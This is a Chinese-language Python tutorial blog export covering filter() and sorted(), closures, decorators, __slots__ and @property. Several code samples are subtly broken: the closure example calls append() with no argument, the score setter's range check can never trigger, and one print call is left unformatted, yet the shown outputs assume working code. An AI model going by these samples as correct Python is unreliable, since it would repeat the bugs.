<p>和<code>map()</code>类似，<code>filter()</code>也接收一个函数和一个序列。和<code>map()</code>不同的是，<code>filter()</code>把传入的函数依次作用于每个元素，然后根据返回值是<code>True</code>还是<code>False</code>决定保留还是丢弃该元素。<code>filter()</code>函数返回的是一个<code>Iterator</code>，也就是一个惰性序列。</p>
<h3 id="Example-v3">Example</h3>
<p>在一个list中，删掉偶数，只保留奇数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_odd</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span></span><br><span class="line"></span><br><span class="line">list(filter(is_odd, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]))</span><br></pre></td></tr></table></figure>
<p>把一个序列中的空字符串删掉：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_empty</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s <span class="keyword">and</span> s.strip()</span><br><span class="line"></span><br><span class="line">list(filter(not_empty, [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;  &#x27;</span>]))</span><br></pre></td></tr></table></figure>
<h3 id="Exercise-v2">Exercise</h3>
<p>回数是指从左向右读和从右向左读都是一样的数，例如<code>12321</code>，<code>909</code>。请利用<code>filter()</code>筛选出回数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_palindrome</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> str(n)==str(n)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">output = filter(is_palindrome, range(<span class="number">1</span>, <span class="number">1000</span>))</span><br></pre></td></tr></table></figure>
<h2 id="Sorted-Function">Sorted Function</h2>
<h3 id="Definition-v4">Definition</h3>
<p><code>sorted()</code>函数除了可以对<code>list</code>进行排序之外，它还可以接收一个<code>key</code>函数来实现自定义排序。</p>
<h3 id="Example-v4">Example</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sorted([<span class="number">36</span>, <span class="number">5</span>, <span class="number">-12</span>, <span class="number">9</span>, <span class="number">-21</span>])</span><br><span class="line">[<span class="number">-21</span>, <span class="number">-12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">36</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sorted([<span class="number">36</span>, <span class="number">5</span>, <span class="number">-12</span>, <span class="number">9</span>, <span class="number">-21</span>], key=abs)</span><br><span class="line">[<span class="number">5</span>, <span class="number">9</span>, <span class="number">-12</span>, <span class="number">-21</span>, <span class="number">36</span>]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>函数式编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Python函数式编程-闭包</title>
    <url>/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85/</url>
    <content><![CDATA[<h1 id="Python函数式编程-闭包">Python函数式编程-闭包</h1>
<p>搬运自https://serholiu.com/python-closures</p>
<p>首先给出闭包的一种浅显的定义（可能不够准确）：要形成闭包，首先得有一个嵌套的函数，即函数中定义了另一个函数，闭包则是一个集合，它包括了外部函数的局部变量，这些局部变量在外部函数返回后也继续存在，并能被内部函数引用。</p>
<h2 id="举个例子">举个例子</h2>
<p>定义一个函数 <code>generate_power_func</code>，它返回另一个函数，现在闭包形成的条件已经达到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_power_func</span>(<span class="params">n</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;id(n): %X&#x27;</span> % id(n))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nth_power</span>(<span class="params">x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> x**n</span><br><span class="line">    print(<span class="string">&#x27;id(nth_power): %X&#x27;</span> % id(nth_power))</span><br><span class="line">    <span class="keyword">return</span> nth_power</span><br></pre></td></tr></table></figure>
<p>对于内部函数 <code>nth_power</code>，它能引用到外部函数的局部变量 <code>n</code>，而且即使 <code>generate_power_func</code> 已经返回。把这种现象就称为闭包。具体使用一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>raised_to_4 = generate_power_func(<span class="number">4</span>)</span><br><span class="line">id(n): <span class="number">7</span>FF968E462F0</span><br><span class="line">id(nth_power): <span class="number">1</span>A5E3415510</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>repr(raised_to_4)</span><br><span class="line"><span class="string">&#x27;&lt;function generate_power_func.&lt;locals&gt;.nth_power at 0x000001A5E3415510&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>可以看出，当<code>generate_power_func(4)</code>执行后，创建并返回了<code>nth_power</code>这个函数对象，内存地址是<code>1A5E3415510</code>，并且发现<code>raised_to_4</code>和它的内存地址相同，**即<code>raised_to_4</code>**只是这个函数对象的一个引用。先在全局命名空间中删除 <code>generate_power_func</code>，再试试会出现什么结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> generate_power_func</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>raised_to_4(<span class="number">2</span>)</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
<p>这就是闭包的作用，外部函数的局部变量可以被内部函数引用，即使外部函数已经返回了。</p>
<h2 id="closure-属性和cell对象">__closure__属性和cell对象</h2>
<p>那么，闭包在Python内部到底是怎么实现的呢？Python 中函数也是对象，所以函数也有很多属性，和闭包相关的就是 <code>__closure__</code> 属性。<code>__closure__</code> 属性定义的是一个包含 cell 对象的元组，其中元组中的每一个 cell 对象用来保存作用域中变量的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>raised_to_4.__closure__</span><br><span class="line">(&lt;cell at <span class="number">0x000001A5E320DDC8</span>: int object at <span class="number">0x00007FF968E462F0</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(raised_to_4.__closure__)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span>(<span class="params">raised_to_4.__closure__[<span class="number">0</span>]</span>)</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">cell</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">raised_to_4</span>.<span class="title">__closure__</span>[0].<span class="title">cell_contents</span></span></span><br><span class="line"><span class="class">4</span></span><br></pre></td></tr></table></figure>
<p>就如刚才所说，在 <code>raised_to_4</code> 的 <code>__closure__</code> 属性中有外部函数变量 <code>n</code> 的引用，通过内存地址可以发现，引用的都是同一个 <code>n</code>。如果没用形成闭包，则 <code>__closure__</code> 属性为 <code>None</code>。</p>
<h2 id="Attention">Attention</h2>
<p>一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了<code>f()</code>才执行。我们来看一个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line">            <span class="keyword">return</span> i*i</span><br><span class="line">        fs.append()</span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line">f1, f2, f3 = count()</span><br></pre></td></tr></table></figure>
<p>在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都返回了。你可能认为调用<code>f1()</code>，<code>f2()</code>和<code>f3()</code>结果应该是<code>1</code>，<code>4</code>，<code>9</code>，但实际结果是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3()</span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure>
<p>全部都是<code>9</code>！原因就在于返回的函数引用了变量<code>i</code>，但它并非立刻执行。等到3个函数都返回时，它们所引用的变量<code>i</code>已经变成了<code>3</code>，因此最终结果为<code>9</code>。</p>
<p><strong>返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。</strong></p>
<p>如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该循环变量后续如何更改，已绑定到函数参数的值不变：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">j</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">g</span>():</span></span><br><span class="line">            <span class="keyword">return</span> j*j</span><br><span class="line">        <span class="keyword">return</span> g</span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        fs.append(f(i)) <span class="comment"># f(i)立刻被执行，因此i的当前值被传入f()</span></span><br><span class="line">    <span class="keyword">return</span> fs</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>函数式编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Python函数式编程-装饰器</title>
    <url>/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
    <content><![CDATA[<h1 id="Python函数式编程-装饰器">Python函数式编程-装饰器</h1>
<p>搬运自https://foofish.net/python-decorator.html</p>
<p>原文有若干处错误！</p>
<h2 id="引入">引入</h2>
<p>装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数/类对象。</p>
<p>它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景，装饰器是解决这类问题的绝佳设计。有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码到装饰器中并继续重用。</p>
<p>概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。</p>
<p>接下来，我们一步一步的来看装饰器是怎么形成和起作用的。</p>
<p>先来看一个简单函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>现在有一个新的需求，希望可以记录下函数的执行日志，于是在代码中添加日志代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line">    logging.info(<span class="string">&#x27;foo is running&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>假设现在其他函数也有类似的需求，如果再写一个logging在其他函数里面，这样就会造成大量重复代码。首先想到的解决办法肯定是重新定义一个函数专门来处理日志。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">func</span>):</span></span><br><span class="line">    logging.warn(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    func()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">use_logging(foo)</span><br></pre></td></tr></table></figure>
<p>这样做逻辑上是没问题的，功能是实现了，但是我们调用的时候不再是调用真正的业务逻辑<code>foo</code>函数，而是换成了<code>use_logging</code>函数。那么有没有更好的方式的呢？当然有，答案就是装饰器。</p>
<h2 id="简单装饰器">简单装饰器</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">func</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">		logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">		<span class="keyword">return</span> func() <span class="comment"># 把foo当作参数传进来时，执行func()就相当于执行了foo()</span></span><br><span class="line">	<span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">	print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foo = use_logging(foo) <span class="comment"># 因为装饰器 use_logging(foo) 返回的时函数对象 wrapper，这条语句相当于  foo = wrapper</span></span><br><span class="line">foo() <span class="comment"># 执行foo()就相当于执行 wrapper()</span></span><br></pre></td></tr></table></figure>
<p>use_logging 就是一个装饰器，它一个普通的函数，它把执行真正业务逻辑的函数 func 包裹在其中，看起来像 foo 被 use_logging 装饰了一样，use_logging 返回的也是一个函数，这个函数的名字叫 wrapper。</p>
<h2 id="语法糖">语法糖</h2>
<p><code>@</code>符号就是装饰器的语法糖，它放在函数开始定义的地方，这样就可以省略最后一步再次赋值的操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">func</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">		logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">		<span class="keyword">return</span> func()</span><br><span class="line">	<span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">	print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#foo = use_logging(foo)</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>
<p>如上所示，有了 @ ，我们就可以省去<code>foo = use_logging(foo)</code>这一句了，直接调用 foo() 即可得到想要的结果。</p>
<h2 id="带参数的foo">带参数的foo()</h2>
<p>如果业务逻辑函数 foo 需要参数，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">name</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;I am %s&#x27;</span>, name)</span><br></pre></td></tr></table></figure>
<p>我们可以在定义 wrapper 函数的时候指定参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">name</span>):</span></span><br><span class="line">    logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    <span class="keyword">return</span> func(name)</span><br></pre></td></tr></table></figure>
<p>这样 foo 函数定义的参数就可以定义在 wrapper 函数中。如果<code>func</code>函数需要若干个参数的话，可以用<code>*args</code>代替：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args</span>):</span></span><br><span class="line">    logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    <span class="keyword">return</span> func(*args)</span><br></pre></td></tr></table></figure>
<p>如果 foo 函数还定义了一些关键字参数呢？比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">name, age=None, height=None</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;I am %s, age %s, height %s&#x27;</span> % (name, age, height))</span><br></pre></td></tr></table></figure>
<p>这时，你就可以把 wrapper 函数指定关键字函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">    <span class="comment"># args是一个数组，kwargs一个字典</span></span><br><span class="line">    logging.warn(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    <span class="keyword">return</span> func(*args, **kw)</span><br></pre></td></tr></table></figure>
<p>完整的函数定义和调用如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">    	logging.warn(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    	<span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">	<span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">	print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>
<h2 id="带参数的装饰器">带参数的装饰器</h2>
<p>装饰器的语法允许我们在调用时，提供其它参数，比如<code>@decorator(a)</code>。这样，就为装饰器的编写和使用提供了更大的灵活性。比如：我们可以在装饰器中指定日志的等级，因为不同业务函数可能需要的日志级别是不一样的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">level</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">		<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">			<span class="keyword">if</span> level == <span class="string">&#x27;warn&#x27;</span>:</span><br><span class="line">				logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">			<span class="keyword">elif</span> level == <span class="string">&#x27;error&#x27;</span>:</span><br><span class="line">				logging.error(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">			<span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">		<span class="keyword">return</span> wrapper</span><br><span class="line">	<span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging(level=&#x27;error&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">name, age</span>):</span></span><br><span class="line">	print(<span class="string">&#x27;I am %s, %s age&#x27;</span> % (name, age))</span><br><span class="line"></span><br><span class="line">foo(<span class="string">&#x27;foo&#x27;</span>, <span class="number">19</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面的<code>use_logging</code>是允许带参数的装饰器。它实际上是对原有装饰器的一个函数封装，并返回一个装饰器。我们可以将它理解为一个含有参数的闭包。</p>
<p>具体而言，和两层嵌套的decorator相比，3层嵌套的效果是这样的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo = use_logging(<span class="string">&#x27;error&#x27;</span>)(foo)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先执行<code>use_logging('error')</code>返回的是<code>decorator</code>，再调用返回的函数，参数是<code>foo</code>，即<code>decorator(foo)</code>，返回的最终是<code>wrapper</code>函数。</p>
<p><code>@use_logging(level=&quot;warn&quot;)</code>等价于<code>@decorator</code></p>
<h2 id="functools-wraps">functools.wraps</h2>
<p>使用装饰器极大地复用了代码，但是他有一个缺点就是原函数的元信息不见了，比如函数的<code>docstring</code>、<code>__name__</code>、参数列表，先看例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">            print(<span class="string">&#x27;%s %s():&#x27;</span> % (text, func.__name__))</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@log(&#x27;execute&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;2015-3-25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">now()</span><br><span class="line">print(now.__name__)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">execute now():</span><br><span class="line"><span class="number">2015</span><span class="number">-3</span><span class="number">-25</span></span><br><span class="line"><span class="string">&#x27;wrapper&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为返回的那个<code>wrapper()</code>函数名字就是<code>'wrapper'</code>，所以，需要把原始函数的<code>__name__</code>等属性复制到<code>wrapper()</code>函数中，否则，有些依赖函数签名的代码执行就会出错。</p>
<p>可以直接使用Python内置的<code>functools.wraps</code>函数解决上述问题。一个完整的decorator如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">func</span>):</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;call %s():&#x27;</span> % func.__name__)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>针对带参数的装饰器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line"><span class="meta">        @functools.wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">            print(<span class="string">&#x27;%s %s():&#x27;</span> % (text, func.__name__))</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>函数式编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Python面向对象高级编程之slots、@property和多重继承</title>
    <url>/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF/</url>
    <content><![CDATA[<h1 id="Python面向对象高级编程之slots、-property和多重继承">Python面向对象高级编程之slots、@property和多重继承</h1>
<p>Python对于类的属性的处理是非常灵活的，正常情况下，当我们定义了一个class，创建了一个class的实例后，我们可以给该实例绑定任何属性和方法 。今天这一篇文章就将两个关于对象的属性的用法：<code>slots</code>和<code>@property</code>。</p>
<h2 id="slots-变量">__slots__变量</h2>
<p>在类中定义<code>__slots__</code>变量可以限制实例的属性，比如， 只允许对Student实例添加<code>name</code>和<code>age</code>属性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>():</span></span><br><span class="line">    __slots__ = (<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>即用tuple定义允许绑定的属性名称，试图在实例中绑定其他属性会得到<code>AttributeError</code>的错误。</p>
<p>使用<code>__slots__</code>要注意，<code>__slots__</code>定义的属性仅对当前类实例起作用，<strong>对继承的子类是不起作用的</strong>。</p>
<p>除非在子类中也定义<code>__slots__</code>，这样，子类实例允许定义的属性就是自身的<code>__slots__</code>加上父类的<code>__slots__</code>。</p>
<h2 id="property">@property</h2>
<p>在绑定属性时，如果我们直接把属性暴露出去，虽然写起来很简单，但是，没办法检查参数，导致可以把成绩随便改，为了限制score的范围，通常的做法就是设置<code>set</code>和<code>get</code>方法。具体来说，可以通过一个<code>set_score()</code>方法来设置成绩，再通过一个<code>get_score()</code>来获取成绩，这样，在<code>set_score()</code>方法里，就可以检查参数。</p>
<p>但是通过Python内置的<code>@property</code>就可以把一个方法变成属性调用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>():</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._score;</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @score.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span>(<span class="params">self, value</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, int):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;score must be an integer&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">0</span> <span class="keyword">and</span> value &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;score must between 0 ~ 100!&#x27;</span>)</span><br><span class="line">        self._score = value</span><br></pre></td></tr></table></figure>
<p>把一个getter方法变成属性，只需要加上<code>@property</code>就可以了，此时，<code>@property</code>本身又创建了另一个装饰器<code>@score.setter</code>，负责把一个setter方法变成属性赋值，于是，我们就拥有一个可控的属性操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Student()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.score = <span class="number">60</span> <span class="comment"># OK，实际转化为s.set_score(60)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.score <span class="comment"># OK，实际转化为s.get_score()</span></span><br><span class="line"><span class="number">60</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.score = <span class="number">9999</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ValueError: score must between <span class="number">0</span> ~ <span class="number">100</span>!</span><br></pre></td></tr></table></figure>
<p>还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>(<span class="params">object</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">birth</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._birth</span><br><span class="line"></span><br><span class="line"><span class="meta">    @birth.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">birth</span>(<span class="params">self, value</span>):</span></span><br><span class="line">        self._birth = value</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2015</span> - self._birth</span><br></pre></td></tr></table></figure>
<h2 id="多重继承">多重继承</h2>
<p>在谈到Python的多重继承的时候，绕不开的一个名词就是<code>MixIn</code>，如果之前写过<code>Django Restful Framework</code>框架，从很多函数名中就可以看出里面用到了很多<code>MixIn</code>。</p>
<p>在设计类的继承关系时，通常，主线都是单一继承下来的，例如，<code>Ostrich</code>继承自<code>Bird</code>。但是，如果需要“混入”额外的功能，通过多重继承就可以实现，比如，让<code>Ostrich</code>除了继承自<code>Bird</code>外，再同时继承<code>Runnable</code>。这种设计通常称之为<code>MixIn</code>。</p>
<p>比如：</p>
